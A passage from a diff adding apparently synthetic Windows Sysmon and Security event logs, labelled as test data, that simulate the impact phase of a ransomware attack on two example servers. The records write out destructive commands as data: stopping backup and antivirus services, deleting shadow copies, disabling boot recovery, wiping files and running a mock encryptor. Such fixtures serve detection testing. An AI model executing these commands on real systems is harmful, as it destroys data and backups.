+            "ParentProcessGuid": "{C257A465-DC01-0040-1DE462D18ED8}",
+            "ParentProcessId": "5062",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "DC01",
+          "id": "003"
+        },
+        "timestamp": "2026-01-30T18:49:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Stop Sophos service",
+      "sequence": 25,
+      "relative_time": "T+11:01:30",
+      "timestamp": "2026-01-30T19:01:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "DC01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:08:48.262",
+            "ProcessGuid": "{C257A465-DC01-0058-C5B67F4F8F92}",
+            "ProcessId": "6821",
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net stop mepocs /y",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-DC01-0040-1DE462D18ED8}",
+            "ParentProcessId": "5062",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "DC01",
+          "id": "003"
+        },
+        "timestamp": "2026-01-30T19:01:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Stop Veeam Backup service",
+      "sequence": 26,
+      "relative_time": "T+11:14:30",
+      "timestamp": "2026-01-30T19:14:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "DC01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:08:48.262",
+            "ProcessGuid": "{C257A465-DC01-0058-C5B67F4F8F92}",
+            "ProcessId": "6821",
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net stop veeam /y",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-DC01-0040-1DE462D18ED8}",
+            "ParentProcessId": "5062",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "DC01",
+          "id": "003"
+        },
+        "timestamp": "2026-01-30T19:14:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Stop Windows Backup service",
+      "sequence": 27,
+      "relative_time": "T+11:28:00",
+      "timestamp": "2026-01-30T19:28:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "DC01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:08:48.262",
+            "ProcessGuid": "{C257A465-DC01-0058-C5B67F4F8F92}",
+            "ProcessId": "6821",
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net stop backup /y",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-DC01-0040-1DE462D18ED8}",
+            "ParentProcessId": "5062",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "DC01",
+          "id": "003"
+        },
+        "timestamp": "2026-01-30T19:28:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Delete shadow copies (Sysmon)",
+      "sequence": 28,
+      "relative_time": "T+11:42:00",
+      "timestamp": "2026-01-30T19:42:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "DC01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:10:29.830",
+            "ProcessGuid": "{C257A465-DC01-0060-2CBE59E124DA}",
+            "ProcessId": "7066",
+            "Image": "C:\\Windows\\System32\\vssadmin.exe",
+            "CommandLine": "vssadmin.exe delete shadows /all /quiet",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "Hashes": "SHA256=9B7C7C0CDEAA3F26B9D1A0CAFE1234567890ABCDEF1234567890ABCDEF123456",
+            "ParentProcessGuid": "{C257A465-DC01-0059-C1B45DA47DC5}",
+            "ParentProcessId": "6938",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "ParentCommandLine": "cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "DC01",
+          "id": "003"
+        },
+        "timestamp": "2026-01-30T19:42:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Delete shadow copies (Security)",
+      "sequence": 29,
+      "relative_time": "T+11:56:30",
+      "timestamp": "2026-01-30T19:56:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Security",
+          "event_id": 4688,
+          "provider_name": "Microsoft-Windows-Security-Auditing",
+          "computer_name": "DC01.example.local",
+          "event_data": {
+            "SubjectUserSid": "S-1-5-18",
+            "SubjectUserName": "SYSTEM",
+            "SubjectDomainName": "NT AUTHORITY",
+            "SubjectLogonId": "0x3E7",
+            "NewProcessId": "0x1B9A",
+            "NewProcessName": "C:\\Windows\\System32\\vssadmin.exe",
+            "TokenElevationType": "%%1936",
+            "ProcessId": "0x1B1A",
+            "CommandLine": "vssadmin.exe delete shadows /all /quiet",
+            "TargetUserSid": "S-1-5-18",
+            "TargetUserName": "SYSTEM",
+            "TargetDomainName": "NT AUTHORITY",
+            "TargetLogonId": "0x3E7",
+            "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
+            "MandatoryLabel": "S-1-16-16384"
+          }
+        },
+        "agent": {
+          "name": "DC01",
+          "id": "003"
+        },
+        "timestamp": "2026-01-30T19:56:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Delete shadow copies via WMIC (Sysmon)",
+      "sequence": 30,
+      "relative_time": "T+12:11:30",
+      "timestamp": "2026-01-30T20:11:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "DC01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:10:41.793",
+            "ProcessGuid": "{C257A465-DC01-0061-4C32D98BE172}",
+            "ProcessId": "7168",
+            "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+            "CommandLine": "wmic shadowcopy delete /nointeractive",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "Hashes": "SHA256=3B7C3E7F8A9B0C1D2E3F4A5B6C7D8E9F0A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D",
+            "ParentProcessGuid": "{C257A465-DC01-0060-2CBE59E124DA}",
+            "ParentProcessId": "7066",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "ParentCommandLine": "cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "DC01",
+          "id": "003"
+        },
+        "timestamp": "2026-01-30T20:11:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Delete shadow copies via WMIC (Security)",
+      "sequence": 31,
+      "relative_time": "T+12:27:00",
+      "timestamp": "2026-01-30T20:27:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Security",
+          "event_id": 4688,
+          "provider_name": "Microsoft-Windows-Security-Auditing",
+          "computer_name": "DC01.example.local",
+          "event_data": {
+            "SubjectUserSid": "S-1-5-18",
+            "SubjectUserName": "SYSTEM",
+            "SubjectDomainName": "NT AUTHORITY",
+            "SubjectLogonId": "0x3E7",
+            "NewProcessId": "0x1C00",
+            "NewProcessName": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+            "TokenElevationType": "%%1936",
+            "ProcessId": "0x1B9A",
+            "CommandLine": "wmic shadowcopy delete /nointeractive",
+            "TargetUserSid": "S-1-5-18",
+            "TargetUserName": "SYSTEM",
+            "TargetDomainName": "NT AUTHORITY",
+            "TargetLogonId": "0x3E7",
+            "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
+            "MandatoryLabel": "S-1-16-16384"
+          }
+        },
+        "agent": {
+          "name": "DC01",
+          "id": "003"
+        },
+        "timestamp": "2026-01-30T20:27:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Disable Windows recovery (Sysmon)",
+      "sequence": 32,
+      "relative_time": "T+12:43:00",
+      "timestamp": "2026-01-30T20:43:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "DC01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:10:54.246",
+            "ProcessGuid": "{C257A465-DC01-0062-356F5A48DC10}",
+            "ProcessId": "7272",
+            "Image": "C:\\Windows\\System32\\bcdedit.exe",
+            "CommandLine": "bcdedit /set {default} recoveryenabled No",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-DC01-0061-4C32D98BE172}",
+            "ParentProcessId": "7168",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "DC01",
+          "id": "003"
+        },
+        "timestamp": "2026-01-30T20:43:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Disable Windows recovery (Security)",
+      "sequence": 33,
+      "relative_time": "T+12:59:30",
+      "timestamp": "2026-01-30T20:59:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Security",
+          "event_id": 4688,
+          "provider_name": "Microsoft-Windows-Security-Auditing",
+          "computer_name": "DC01.example.local",
+          "event_data": {
+            "SubjectUserSid": "S-1-5-18",
+            "SubjectUserName": "SYSTEM",
+            "SubjectDomainName": "NT AUTHORITY",
+            "SubjectLogonId": "0x3E7",
+            "NewProcessId": "0x1C68",
+            "NewProcessName": "C:\\Windows\\System32\\bcdedit.exe",
+            "TokenElevationType": "%%1936",
+            "ProcessId": "0x1C00",
+            "CommandLine": "bcdedit /set {default} recoveryenabled No",
+            "TargetUserSid": "S-1-5-18",
+            "TargetUserName": "SYSTEM",
+            "TargetDomainName": "NT AUTHORITY",
+            "TargetLogonId": "0x3E7",
+            "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
+            "MandatoryLabel": "S-1-16-16384"
+          }
+        },
+        "agent": {
+          "name": "DC01",
+          "id": "003"
+        },
+        "timestamp": "2026-01-30T20:59:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Ignore boot failures (Sysmon)",
+      "sequence": 34,
+      "relative_time": "T+13:16:30",
+      "timestamp": "2026-01-30T21:16:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "DC01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:10:54.246",
+            "ProcessGuid": "{C257A465-DC01-0062-356F5A48DC10}",
+            "ProcessId": "7272",
+            "Image": "C:\\Windows\\System32\\bcdedit.exe",
+            "CommandLine": "bcdedit /set {default} bootstatuspolicy ignoreallfailures",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-DC01-0061-4C32D98BE172}",
+            "ParentProcessId": "7168",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "DC01",
+          "id": "003"
+        },
+        "timestamp": "2026-01-30T21:16:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Ignore boot failures (Security)",
+      "sequence": 35,
+      "relative_time": "T+13:34:00",
+      "timestamp": "2026-01-30T21:34:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Security",
+          "event_id": 4688,
+          "provider_name": "Microsoft-Windows-Security-Auditing",
+          "computer_name": "DC01.example.local",
+          "event_data": {
+            "SubjectUserSid": "S-1-5-18",
+            "SubjectUserName": "SYSTEM",
+            "SubjectDomainName": "NT AUTHORITY",
+            "SubjectLogonId": "0x3E7",
+            "NewProcessId": "0x1C68",
+            "NewProcessName": "C:\\Windows\\System32\\bcdedit.exe",
+            "TokenElevationType": "%%1936",
+            "ProcessId": "0x1C00",
+            "CommandLine": "bcdedit /set {default} bootstatuspolicy ignoreallfailures",
+            "TargetUserSid": "S-1-5-18",
+            "TargetUserName": "SYSTEM",
+            "TargetDomainName": "NT AUTHORITY",
+            "TargetLogonId": "0x3E7",
+            "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
+            "MandatoryLabel": "S-1-16-16384"
+          }
+        },
+        "agent": {
+          "name": "DC01",
+          "id": "003"
+        },
+        "timestamp": "2026-01-30T21:34:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Data destruction via SDelete",
+      "sequence": 36,
+      "relative_time": "T+13:52:00",
+      "timestamp": "2026-01-30T21:52:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "DC01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:11:26.016",
+            "ProcessGuid": "{C257A465-DC01-0063-FE47D4295BE7}",
+            "ProcessId": "7373",
+            "Image": "C:\\Windows\\System32\\sdelete64.exe",
+            "CommandLine": "sdelete64.exe -p 3 -s C:\\Users\\*\\Documents\\*",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-DC01-0062-356F5A48DC10}",
+            "ParentProcessId": "7272",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "DC01",
+          "id": "003"
+        },
+        "timestamp": "2026-01-30T21:52:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Free space overwrite via cipher.exe",
+      "sequence": 37,
+      "relative_time": "T+14:10:30",
+      "timestamp": "2026-01-30T22:10:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "DC01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:11:32.195",
+            "ProcessGuid": "{C257A465-DC01-0064-0F499039D7A8}",
+            "ProcessId": "7402",
+            "Image": "C:\\Windows\\System32\\cipher.exe",
+            "CommandLine": "cipher.exe /w:C:",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-DC01-0063-FE47D4295BE7}",
+            "ParentProcessId": "7373",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "DC01",
+          "id": "003"
+        },
+        "timestamp": "2026-01-30T22:10:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Ransomware process execution (Sysmon)",
+      "sequence": 38,
+      "relative_time": "T+14:29:30",
+      "timestamp": "2026-01-30T22:29:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "DC01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:11:36.839",
+            "ProcessGuid": "{C257A465-DC01-0065-58877EF5EAF0}",
+            "ProcessId": "7580",
+            "Image": "C:\\Users\\Public\\ransomware.exe",
+            "CommandLine": "ransomware.exe --encrypt --path C:\\Users\\admin.svc\\Documents",
+            "CurrentDirectory": "C:\\Users\\Public\\",
+            "User": "EXAMPLE\\admin.svc",
+            "IntegrityLevel": "High",
+            "Hashes": "SHA256=BADCAFE0DEADBEEF1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF",
+            "ParentProcessGuid": "{C257A465-DC01-0064-0F499039D7A8}",
+            "ParentProcessId": "7402",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "ParentCommandLine": "cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "DC01",
+          "id": "003"
+        },
+        "timestamp": "2026-01-30T22:29:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Ransomware process execution (Security)",
+      "sequence": 39,
+      "relative_time": "T+14:49:00",
+      "timestamp": "2026-01-30T22:49:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Security",
+          "event_id": 4688,
+          "provider_name": "Microsoft-Windows-Security-Auditing",
+          "computer_name": "DC01.example.local",
+          "event_data": {
+            "SubjectUserSid": "S-1-5-21-1234567890-1234567890-1234567890-1001",
+            "SubjectUserName": "admin.svc",
+            "SubjectDomainName": "EXAMPLE",
+            "SubjectLogonId": "0x3E7",
+            "NewProcessId": "0x1D9C",
+            "NewProcessName": "C:\\Users\\Public\\ransomware.exe",
+            "TokenElevationType": "%%1937",
+            "ProcessId": "0x1CEA",
+            "CommandLine": "ransomware.exe --encrypt --path C:\\Users\\admin.svc\\Documents",
+            "TargetUserSid": "S-1-5-21-1234567890-1234567890-1234567890-1001",
+            "TargetUserName": "admin.svc",
+            "TargetDomainName": "EXAMPLE",
+            "TargetLogonId": "0x3E7",
+            "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
+            "MandatoryLabel": "S-1-16-12288"
+          }
+        },
+        "agent": {
+          "name": "DC01",
+          "id": "003"
+        },
+        "timestamp": "2026-01-30T22:49:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "File encryption (ransomware)",
+      "sequence": 40,
+      "relative_time": "T+15:09:00",
+      "timestamp": "2026-01-30T23:09:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 11,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "DC01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:11:36.839",
+            "ProcessGuid": "{C257A465-DC01-0065-58877EF5EAF0}",
+            "ProcessId": "7580",
+            "Image": "C:\\Users\\Public\\ransomware.exe",
+            "TargetFilename": "C:\\Users\\admin.svc\\Documents\\important.encrypted",
+            "CreationUtcTime": "2026-01-30 12:11:36.839",
+            "User": "EXAMPLE\\admin.svc"
+          }
+        },
+        "agent": {
+          "name": "DC01",
+          "id": "003"
+        },
+        "timestamp": "2026-01-30T23:09:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Stop Volume Shadow Copy service",
+      "sequence": 41,
+      "relative_time": "T+15:29:30",
+      "timestamp": "2026-01-30T23:29:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "FILESERVER01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:11:48.979",
+            "ProcessGuid": "{C257A465-FS01-0066-49EB24B80D25}",
+            "ProcessId": "7623",
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net stop vss /y",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-FS01-0049-1E22E9ECCA8D}",
+            "ParentProcessId": "5943",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "FS01",
+          "id": "004"
+        },
+        "timestamp": "2026-01-30T23:29:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Stop SQL Server service",
+      "sequence": 42,
+      "relative_time": "T+15:50:30",
+      "timestamp": "2026-01-30T23:50:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "FILESERVER01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:11:48.979",
+            "ProcessGuid": "{C257A465-FS01-0066-49EB24B80D25}",
+            "ProcessId": "7623",
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net stop sql /y",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-FS01-0049-1E22E9ECCA8D}",
+            "ParentProcessId": "5943",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "FS01",
+          "id": "004"
+        },
+        "timestamp": "2026-01-30T23:50:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Stop Backup services service",
+      "sequence": 43,
+      "relative_time": "T+16:12:00",
+      "timestamp": "2026-01-31T00:12:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "FILESERVER01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:11:48.979",
+            "ProcessGuid": "{C257A465-FS01-0066-49EB24B80D25}",
+            "ProcessId": "7623",
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net stop svc$ /y",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-FS01-0049-1E22E9ECCA8D}",
+            "ParentProcessId": "5943",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "FS01",
+          "id": "004"
+        },
+        "timestamp": "2026-01-31T00:12:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Stop MemSQL service",
+      "sequence": 44,
+      "relative_time": "T+16:34:00",
+      "timestamp": "2026-01-31T00:34:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "FILESERVER01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:11:48.979",
+            "ProcessGuid": "{C257A465-FS01-0066-49EB24B80D25}",
+            "ProcessId": "7623",
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net stop memtas /y",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-FS01-0049-1E22E9ECCA8D}",
+            "ParentProcessId": "5943",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "FS01",
+          "id": "004"
+        },
+        "timestamp": "2026-01-31T00:34:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Stop Sophos service",
+      "sequence": 45,
+      "relative_time": "T+16:56:30",
+      "timestamp": "2026-01-31T00:56:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "FILESERVER01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:11:48.979",
+            "ProcessGuid": "{C257A465-FS01-0066-49EB24B80D25}",
+            "ProcessId": "7623",
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net stop mepocs /y",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-FS01-0049-1E22E9ECCA8D}",
+            "ParentProcessId": "5943",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "FS01",
+          "id": "004"
+        },
+        "timestamp": "2026-01-31T00:56:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Stop Veeam Backup service",
+      "sequence": 46,
+      "relative_time": "T+17:19:30",
+      "timestamp": "2026-01-31T01:19:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "FILESERVER01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:11:48.979",
+            "ProcessGuid": "{C257A465-FS01-0066-49EB24B80D25}",
+            "ProcessId": "7623",
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net stop veeam /y",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-FS01-0049-1E22E9ECCA8D}",
+            "ParentProcessId": "5943",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "FS01",
+          "id": "004"
+        },
+        "timestamp": "2026-01-31T01:19:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Stop Windows Backup service",
+      "sequence": 47,
+      "relative_time": "T+17:43:00",
+      "timestamp": "2026-01-31T01:43:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "FILESERVER01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:11:48.979",
+            "ProcessGuid": "{C257A465-FS01-0066-49EB24B80D25}",
+            "ProcessId": "7623",
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net stop backup /y",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-FS01-0049-1E22E9ECCA8D}",
+            "ParentProcessId": "5943",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "FS01",
+          "id": "004"
+        },
+        "timestamp": "2026-01-31T01:43:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Delete shadow copies (Sysmon)",
+      "sequence": 48,
+      "relative_time": "T+18:07:00",
+      "timestamp": "2026-01-31T02:07:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "FILESERVER01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:13:34.150",
+            "ProcessGuid": "{C257A465-FS01-0068-E048FE1D356A}",
+            "ProcessId": "7896",
+            "Image": "C:\\Windows\\System32\\vssadmin.exe",
+            "CommandLine": "vssadmin.exe delete shadows /all /quiet",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "Hashes": "SHA256=9B7C7C0CDEAA3F26B9D1A0CAFE1234567890ABCDEF1234567890ABCDEF123456",
+            "ParentProcessGuid": "{C257A465-FS01-0067-E39625890D4A}",
